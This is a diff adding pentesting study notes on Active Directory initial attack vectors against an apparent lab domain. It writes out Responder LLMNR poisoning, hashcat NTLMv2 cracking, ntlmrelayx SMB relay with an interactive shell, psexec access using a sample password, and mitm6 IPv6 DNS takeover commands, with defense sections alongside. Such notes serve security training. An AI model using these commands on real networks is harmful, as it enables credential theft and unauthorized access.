@@ -77,7 +77,7 @@
  * enable trusts between all domain in the forest
  * shares the enterprise admins and schema admins groups
  
-**Organizational Units (Ous)
+**Organizational Units (Ous)**
 
 * Ous are AD containers that can contain users, groups, computers, and other OUs
 
@@ -136,17 +136,145 @@ shared folders | enables users to search for shared folders based on properties
 ### Joining Our Machines to the Domain
 
 
-## 
-   
+## Attacking Active Directory: Initial Attack Vectors
+
+### Introduction
+
+
+* Top Five Ways I Got Domain Admin - https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
+
+
+### LLMNR Poisoning Overview
+
+* Link Local Multicahe Name Resolution
+* used to identify hosts when DNS fails to do so 
+* Previously NBT-NS
+* Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately respond to 
+
+* **Responder**
+
+ * Step 1. Run Responder
+   ```python Responder.py -l tun0 -rdw ```
+
+ * Step 2. An Event Occurs..
+ * Step 3. Get Dem Hashes
+ * Step 4. Crack Dem Hashes
+    ```hashcat -m 5600 hashes.txt rockyou.txt ```   
+ 
+ ### Capturing NTLMv2 Hashes with Responder
+ 
+ * ```responder -I eth0 -rdwv ```
+ 
+ ### Password Cracking with Hashcat
+ 
+ * ```hashcat -m 5600 ntlmhash.txt rockyou.txt --force ```
+ 
+    * 5600 is used so that hashcat will know that the hash we want to crack is a NTLM hash
+    
+ * we can look for seclist for the password
+ 
+ * for using hashcat in windows we can download the binaries from their site
+ 
+ 
+### LLMNR Poisoning Defense 
+
+* disable LLMNR and NBT-Ns
+* Enable network control
+* make a stron user password (>14 characters and limit common word usage)
+
+### SMB Relay Attacks Overview
+
+**SMB Relay**
+
+* Insted of cracking hashes gathered with Responder, we can instead rely those hashes to specific machines and potentially gain access
+
+* Requirements
+  * SMB signing must be disabled on the target 
+  * Relaayed user credentials must be admin on machine
+
+
+* Step 1. Run Responder 
+* Step 2. ```python Responder.py -I tun0 -rdw ```
+* Step 3.Set up your relay 
   
+  ```python ntlmrelayx.py -tf targets.txt -smb2support ```
+
+* Step 4. An Event Occurs....
+* Step 5. Win
 
 
+### Discovering Hosts with SMB Signing Disabled
+
+* Run nessus to check smbsignning enabkle or disable 
+* Use nmap for smbsignning check 
+  * ```nmap  --script=smb2-security-mode.nse -p445 192.168.57.0/24 ```
+  
+* put the targets in a file 
+
+### SMB Relay Attack Demonstration
+
+* edit the Responder.conf to turn off SMB and HTTP
+* ```responder -I eth0 -rdw ```
+* ``` ntlmrelayx.py -tf targets.txt -smb2support ```
+
+* ``` ntlmrelayx.py -tf targets.txt -smb2support -i ```
+  * where -i flag is used for intrective smb shell
 
 
+### SMB Relay Attack Defenses
+ 
+* Enable SMB Signing on all devices
+* Disable NTLM authentication on network
+* Account Tiering 
+* Local admin restriction
+
+### Gaining Shell Access
+
+* use ```msfconsole ```
+  * use /windows/smb/psexec
+  
+* psexec.py 
+  * ```psexec.py marvel.local//fcastle:Password1@192.168.57.141 ```
+  
+### IPv6 Attacks Overview
+
+* DNS takeover using these attacks
+
+### Installing mitm6
+
+* download it from fox-it/mitm6 from github
+* ```pip3 install - ```
+
+### IPv6 DNS Takeover via mitm6
+
+* ```mitm6 -d marvel.local ```
+* ```ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme ```
 
 
+* Resources 
+  * mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+
+  * Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
 
 
+### IPv6 Attack Defenses
+
+* Disable IPv6
+* Enable LDAP signing and LDAP channel binding
+* Use block rules on firewall
+* if WAPD is not in use internally , disable it via Group policies
+
+
+### Other Attack Vectors and Strategies
+
+* begin day with mitm6 or responder
+* run scan to generate traffic
+* if scan are taking too long, look for websites in scope(http_version)
+* Look for default credentials on web logins
+  * Printers
+  * Jenkins
+  * Etc
+* Think outside the box  
 
 
 
